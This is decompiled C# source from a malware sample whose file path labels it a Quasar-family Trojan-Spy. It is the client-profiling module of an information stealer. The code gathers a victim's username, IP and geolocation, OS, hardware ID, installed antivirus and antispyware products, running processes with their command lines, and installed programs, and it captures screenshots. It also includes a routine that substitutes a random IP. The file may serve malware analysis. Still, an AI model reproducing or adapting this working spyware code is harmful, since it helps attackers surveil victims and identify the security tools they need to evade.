// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.LocalModels.ClientInfoHelper
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using Microsoft.Win32;
using NoiseMe.Drags.App.Data.WMI;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;
using NoiseMe.Drags.App.Models.WMI.Enums;
using NoiseMe.Drags.App.Models.WMI.Objects;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Windows.Forms;

namespace NoiseMe.Drags.App.Models.LocalModels
{
  public static class ClientInfoHelper
  {
    private static Random rnd = new Random();

    public static RemoteClientInformation Create(string SourceID)
    {
      try
      {
        GeoLocationHelper.Initialize();
        Size screenSize = ClientInfoHelper.GetScreenSize();
        string str = TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).ToString();
        if (!str.StartsWith("-"))
          str = "+" + str;
        return new RemoteClientInformation()
        {
          ID = 0,
          LogTime = DateTime.Now,
          SourceID = SourceID,
          UserName = Environment.UserName,
          ClientIP = GeoLocationHelper.GeoInfo.Query,
          Country = GeoLocationHelper.GeoInfo.CountryCode,
          OperationSystem = ClientInfoHelper.ParseOS(),
          HardwareID = ClientInfoHelper.ParseHWID(),
          Hardwares = ClientInfoHelper.ParseHardwares(),
          Antiviruses = ClientInfoHelper.ParseDefenders(),
          Languages = ClientInfoHelper.AvailableLanguages(),
          CurrentLanguage = InputLanguage.CurrentInputLanguage.Culture.EnglishName,
          MonitorSize = string.Format("{0}x{1}", (object) screenSize.Width, (object) screenSize.Height),
          TimeZone = "UTC" + str,
          City = GeoLocationHelper.GeoInfo.City
        };
      }
      catch
      {
        return (RemoteClientInformation) null;
      }
    }

    public static List<RemoteProcess> ListOfProcesses()
    {
      List<RemoteProcess> remoteProcessList = new List<RemoteProcess>();
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(string.Format("SELECT * FROM Win32_Process Where SessionId='{0}'", (object) Process.GetCurrentProcess().SessionId)))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementObject managementObject in objectCollection)
            {
              try
              {
                RemoteProcess remoteProcess = new RemoteProcess()
                {
                  ProcessID = Convert.ToInt32(managementObject["ProcessId"]?.ToString()),
                  ProcessCommandLine = managementObject["CommandLine"]?.ToString(),
                  ProcessName = managementObject["Name"]?.ToString(),
                  ProcessUsername = Environment.MachineName + "\\" + Environment.UserName
                };
                remoteProcessList.Add(remoteProcess);
              }
              catch (Exception ex)
              {
                Console.WriteLine((object) ex);
              }
            }
          }
        }
      }
      catch
      {
      }
      return remoteProcessList;
    }

    public static List<string> ListOfPrograms()
    {
      List<string> stringList = new List<string>();
      try
      {
        using (RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
        {
          foreach (string subKeyName in registryKey1.GetSubKeyNames())
          {
            using (RegistryKey registryKey2 = registryKey1.OpenSubKey(subKeyName))
            {
              string str = (string) registryKey2?.GetValue("DisplayName");
              if (!string.IsNullOrEmpty(str))
                stringList.Add(str);
            }
          }
        }
      }
      catch
      {
      }
      return stringList;
    }

    public static List<string> AvailableLanguages()
    {
      List<string> stringList = new List<string>();
      try
      {
        foreach (InputLanguage installedInputLanguage in (ReadOnlyCollectionBase) InputLanguage.InstalledInputLanguages)
          stringList.Add(installedInputLanguage.Culture.EnglishName);
      }
      catch
      {
      }
      return stringList;
    }

    public static string GetCommandLine(Process process)
    {
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT CommandLine FROM Win32_Process WHERE ProcessId = " + (object) process.Id))
      {
        using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = objectCollection.GetEnumerator())
          {
            if (enumerator.MoveNext())
              return enumerator.Current["CommandLine"]?.ToString();
          }
          return "";
        }
      }
    }

    private static List<Hardware> ParseHardwares()
    {
      List<Hardware> hardwares = new List<Hardware>();
      try
      {
        foreach (Processor processor in (IEnumerable<Processor>) HardwareGatherer.GetProcessors())
          hardwares.Add(new Hardware()
          {
            Caption = processor.Name,
            Parameter = processor.NumberOfCores.ToString(),
            HardType = HardwareType.Processor
          });
        foreach (GraphicsCard graphicsCard in (IEnumerable<GraphicsCard>) HardwareGatherer.GetGraphicsCards())
          hardwares.Add(new Hardware()
          {
            Caption = graphicsCard.Name,
            Parameter = graphicsCard.MemoryCapacity.ToString(),
            HardType = HardwareType.Graphic
          });
      }
      catch
      {
      }
      return hardwares;
    }

    private static string ParseOS()
    {
      try
      {
        return OsGatherer.GetCaption() + " " + OsGatherer.GetOSArchitecture();
      }
      catch
      {
        return "UNKNOWN";
      }
    }

    private static string ParseHWID()
    {
      try
      {
        return DataRecoveryHelper.GetMd5Hash(HardwareGatherer.GetHwid(HwidStrength.Strong, true)).Replace("-", string.Empty);
      }
      catch
      {
        return "UNKNOWN";
      }
    }

    public static byte[] CaptureScreen() => ClientInfoHelper.ImageToByte((Image) ClientInfoHelper.GetScreenshot());

    private static Bitmap GetScreenshot()
    {
      try
      {
        Size screenSize = ClientInfoHelper.GetScreenSize();
        Bitmap screenshot = new Bitmap(screenSize.Width, screenSize.Height);
        using (Graphics graphics = Graphics.FromImage((Image) screenshot))
        {
          graphics.InterpolationMode = InterpolationMode.Bicubic;
          graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
          graphics.SmoothingMode = SmoothingMode.HighSpeed;
          graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), screenSize);
        }
        return screenshot;
      }
      catch
      {
        return (Bitmap) null;
      }
    }

    private static byte[] ImageToByte(Image img)
    {
      try
      {
        if (img == null)
          return (byte[]) null;
        using (MemoryStream memoryStream = new MemoryStream())
        {
          img.Save((Stream) memoryStream, ImageFormat.Png);
          return memoryStream.ToArray();
        }
      }
      catch
      {
        return (byte[]) null;
      }
    }

    private static Size GetScreenSize() => Screen.PrimaryScreen.Bounds.Size;

    public static List<string> ParseDefenders()
    {
      List<string> defenders = new List<string>();
      try
      {
        defenders.AddRange(ClientInfoHelper.ParseAntiViruses().IsNull<IEnumerable<string>>((IEnumerable<string>) new List<string>()));
        foreach (string str in ClientInfoHelper.ParseSpyWares().IsNull<IEnumerable<string>>((IEnumerable<string>) new List<string>()))
        {
          if (!defenders.Contains(str))
            defenders.Add(str);
        }
      }
      catch
      {
      }
      return defenders;
    }

    public static IEnumerable<string> ParseAntiViruses()
    {
      List<string> antiViruses = new List<string>();
      try
      {
        foreach (SecurityProduct securityProduct in (IEnumerable<SecurityProduct>) SecurityGatherer.GetSecurityProducts(SecurityProductType.AntiVirus))
          antiViruses.Add(securityProduct.Name);
      }
      catch
      {
      }
      return (IEnumerable<string>) antiViruses;
    }

    private static IEnumerable<string> ParseSpyWares()
    {
      List<string> spyWares = new List<string>();
      try
      {
        foreach (SecurityProduct securityProduct in (IEnumerable<SecurityProduct>) SecurityGatherer.GetSecurityProducts(SecurityProductType.AntiSpyware))
          spyWares.Add(securityProduct.Name);
      }
      catch
      {
      }
      return (IEnumerable<string>) spyWares;
    }

    private static string RandomIp() => string.Format("{0}.{1}.{2}.{3}", (object) ClientInfoHelper.rnd.Next(1, (int) byte.MaxValue), (object) ClientInfoHelper.rnd.Next(0, (int) byte.MaxValue), (object) ClientInfoHelper.rnd.Next(0, (int) byte.MaxValue), (object) ClientInfoHelper.rnd.Next(0, (int) byte.MaxValue));

    public static RemoteClientInformation CreateRandom(string SourceID)
    {
      try
      {
        GeoLocationHelper.Initialize();
        Size screenSize = ClientInfoHelper.GetScreenSize();
        string str = TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).ToString();
        if (!str.StartsWith("-"))
          str = "+" + str;
        return new RemoteClientInformation()
        {
          ID = 0,
          LogTime = DateTime.Now,
          SourceID = SourceID,
          UserName = Environment.UserName,
          ClientIP = ClientInfoHelper.RandomIp(),
          Country = GeoLocationHelper.GeoInfo.CountryCode,
          OperationSystem = ClientInfoHelper.ParseOS(),
          HardwareID = ClientInfoHelper.ParseHWID(),
          Hardwares = ClientInfoHelper.ParseHardwares(),
          Antiviruses = ClientInfoHelper.ParseDefenders(),
          Languages = ClientInfoHelper.AvailableLanguages(),
          CurrentLanguage = InputLanguage.CurrentInputLanguage.Culture.EnglishName,
          MonitorSize = string.Format("{0}x{1}", (object) screenSize.Width, (object) screenSize.Height),
          TimeZone = "UTC" + str,
          City = GeoLocationHelper.GeoInfo.City
        };
      }
      catch
      {
        return (RemoteClientInformation) null;
      }
    }
  }
}
